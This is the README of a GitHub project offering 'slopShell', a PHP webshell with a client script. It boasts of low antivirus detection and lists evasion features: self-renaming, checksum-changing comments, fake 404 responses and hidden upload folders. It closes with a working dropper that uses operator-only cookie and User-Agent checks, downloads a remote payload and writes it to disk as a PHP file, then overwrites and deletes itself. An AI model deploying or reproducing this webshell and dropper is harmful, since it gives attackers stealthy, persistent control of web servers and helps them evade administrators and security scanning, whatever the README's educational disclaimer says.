[![GitHub forks](https://img.shields.io/github/forks/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/network)
[![GitHub stars](https://img.shields.io/github/stars/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/stargazers)
[![GitHub watchers](https://img.shields.io/github/watchers/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/watchers)
[![GitHub issues](https://img.shields.io/github/issues/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/issues)
[![language](https://img.shields.io/badge/language-PHP-blue?style=plastic)](https://www.php.net)
[![language](https://img.shields.io/badge/language-Powershell-blue?style=plastic)](https://docs.microsoft.com/en-us/powershell/)
[![language](https://img.shields.io/badge/language-Bash-yellow?style=plastic)](https://www.gnu.org/software/bash/)
[![BuyMeACoffee](https://img.shields.io/badge/BuyMeACoffee-Or%20Book-yellowgreen?style=plastic)](https://www.buymeacoffee.com/oldkingcone)


# slopShell
php webshell

Since I derped, and forgot to talk about usage. Here goes.

For this shell to work, you need 2 things, a victim that allows php file upload(yourself, in an educational environment) and a way to send http requests to this webshell (the client script is the 100% best way to communicate with this shell). 


Thank you for all the support the community has given, it means alot to us. Now for things that will be added to this shell, to make it even more awesome. 

 - Mutual TLS, with the ability to generate a CA on the fly(if thats possible) 
 - More refined dropper/shell itself, to ensure that the shell will not be stumbled upon for prolonged access.
 - Future edititions of this will have access to a personal database of cloud entities, its bascially a personal shodan of mine. Fee will be required for this(sorry).


Current VT Detection ratio: 2/59 (most new version)

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/fbec31525f79578305d67847183dbef7c7a64b431aef81fd59aadfbaa10461c5/detection)


Current VT Detection ratio (obfuscated version): 1/59 //This is a refined version of the slimmed down dropper. the overall file length is just under 2kb in size. Slopshell now correctly assigns a randomized useragent with a correct useragent value, that is, an actual useragent like mozilla,opera,chrome,chromium, etc.

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/46920e27a685d707cb82f23c6c76dd3705d6ec9c96b398828d57791bed7af059/detection)

~~__The issue with this detection happening is i have not found a viable workaround for the keyword of eval if there was no call to eval this script would be undetectable.__~~

---
# Setup

Ok, so here we go folks, there was an itch I had to write something in PHP so this is it. This webshell has a few bells and whistles, and more are added everyday. You will need a pgsql server running that you control. However you implement that is on you.

Debian: `apt install -y postgresql php php-pear python3-pip php-readline php-curl libsodium libsodium-dev && python -m pip install proxybroker --user`

RHEL Systems: `dnf -y -b install postgresql-server postgresql php php-pear python3-pip php-readline php-curl libsodium libsodium-devel && python -m pip install proxybroker --user`

WIN: `install the php msi, and make sure you have an active postgresql server that you can connect to running somewhere.`


Once you have these set up properly and can confirm that they are running. A command I would encourge using is with `pg_ctl` you can create the DB that way, or at least init it and start it. Then all the db queries will work fine.

You need to cd into `/lib/` and run `composer install` to install the server side depends that will be required for the client to work. The client now runs much faster than before. 

---
# Credits for the execution methods

You may notice these are a reskin of another Wordpress backdoor, and once i find the repo again, [i will make sure to give credit for the execution of commands function that is present in these shells](https://github.com/leonjza/wordpress-shell/blob/master/shell.php#L47). I do not like to rip off code and believe that credit needs to be given where credit is due. Thank you kind sir, you have helped me quite a bit with this by making your scripts available to the public.

---
## What makes this shell unique?

So, while doing some changes, i thought heck why not add in a way for the ACTUAL shell itself to hide itself from a less than observant admin. Cleaned up the code execution methods, cleaned up the whole script. No longer will it display a fake 500 page, as this attracts too much attention from an observent admin (more so from my time as an admin of a php dev stack on a server) 500 error messages attract a lot of attention, which will mean the shell is more likely to be discovered. A 404 response however, is much less likely to draw in the gaze of the server admin. Making this shell itself much more difficult to detect and find, in addition to the changing filename, finding this shell will be an absolute nightmare. User-Agent customization is still something that will need to be done, or a unique cookie value will need to be used in place of the User-Agent value that however, will not be set by myself and i will let more experienced users customize this shell to their hearts content. Again, if you notice any issues, or any shortcomings(most i have fixed, and have updated this shell to PHP8 for the most part, type hints i still cannot add in and this is for backwards compatibility reasons) please do open an issue and let me know what is wrong, and i will see about fixing it. Thank you, do good fight evil, have fun.

Here is what I was able to come up with for the added evasive routines:
 - The shell will dynamically rename itself (this did break the client for now, I have so many things to change in the client, but this is just a pet project of mine.)
 - The original file will be deleted after it is written to disk the script now also adds a random comment at the top of the file, completely changing the checksum of the file, making signature based detection scanning much more difficult, not polymorphic, would be nice if this can be done in php. May write an additional function to randomize the location of the functions and adds random functions at random locations.
 - The value of the old file and the new file name will be reported back to the user in a header.
 - The shell now response HTTP 404 to everything, even valid requests. (another reason the client script is broken.)
 - Still working on the MTLS portions of the client and shell script.
 - I named it something different than i normally do.
 - Remapped some of the extra functions to fire off by default now, IE OS detection.
 - Added the ability for the script (if the directory is writable) to create a hidden folder for the shell to store the uploaded goodies to, and then reference.
 - Still working on dynamic loading and execution of uploaded scripts.

As I have grown in the language of PHP so will this whole project and the classes will become proper classes, with namespaces and all. Just need some time as i fix the code to more common standards of PHP development. I will likely add in a way to package this shell itself as a WordPress plugin, so that way it can be used in wordpress as well.( a proper plugin at that. )

---
## Images of use cases

Client script usage:
![](https://github.com/oldkingcone/slopShell/blob/master/images/client_usage.png?raw=true)

Reverse Connection initiated from the client script:
![](https://github.com/oldkingcone/slopShell/blob/master/images/reverse_connection_client_script.png?raw=true)


---
## Additional

I as the maintainer, am in no way responsible for the misuse of this product. This was published for legitmate penetration testing/red teaming purposes, and/or for educational value.  Know the applicable laws in your country of residence before using this script, and do not break the law whilst using this. Thank you and have a nice day.

## Slimmed down dropper example: 
```
/* These comments are not present in the actual dropper, these are here to explain what this is doing.*/
<?php
http_response_code(404);
# pre shared values that only the operator of this shell will have. This dropper will be split into 3 parts to include system enumeration.
if (isset($_COOKIE['6e3611c0032725']) && $_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36(d9e1cee219f19c6d7c)'){
    if (isset($_POST['hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df'])){
        $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df = explode('.', unserialize(base64_decode($_COOKIE['6e3611c0032725']), ['allowed_classes' => false]));
        # Pre-shared value that only the operator has access to through the database.
        if ( hash_equals(hash_hmac('sha256', $_COOKIE['6e3611c0032725'], $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[0]), $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[1]) ){
            if (function_exists("com_create_guid") === true){
                $CDd5054278c02f = trim(com_create_guid()).PHP_EOL.PHP_EOL;
            }else{
                $70f4adfb6efefe08db = openssl_random_pseudo_bytes(16);
                $70f4adfb6efefe08db[6] = chr(ord($70f4adfb6efefe08db[6]) & 0x0f | 0x40);
                $70f4adfb6efefe08db[8] = chr(ord($70f4adfb6efefe08db[8]) & 0x3f | 0x80);
                $CDd5054278c02f = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($70f4adfb6efefe08db), 4)).PHP_EOL.PHP_EOL;
            }
            # returns our needed data back to the server, this is broken into 3 parts, the uuid, the filename of our shell/enumeration script, and if we need stealth or not.
            echo $CDd5054278c02f . "_e8a4f6f58c05"."_true".PHP_EOL;
            fputs(fopen('./e8a4f6f58c05.php', 'a+'),base64_decode(file_get_contents($hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[2])));
            foreach (file($_SERVER['SCRIPT_FILENAME']) as $line){
            # if this dropper is activated in the correct way, this portion of the script takes less than a second to complete due to the size of this script.
                fwrite(fopen($_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt($line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
            }
            # dropper routine is finished, no need to exist on the system any longer.
            fclose($_SERVER['SCRIPT_FILENAME']);
            unlink($_SERVER['SCRIPT_FILENAME']);
        }else{
            die();
        }
        die();
    }
}else{
    die();
}
```
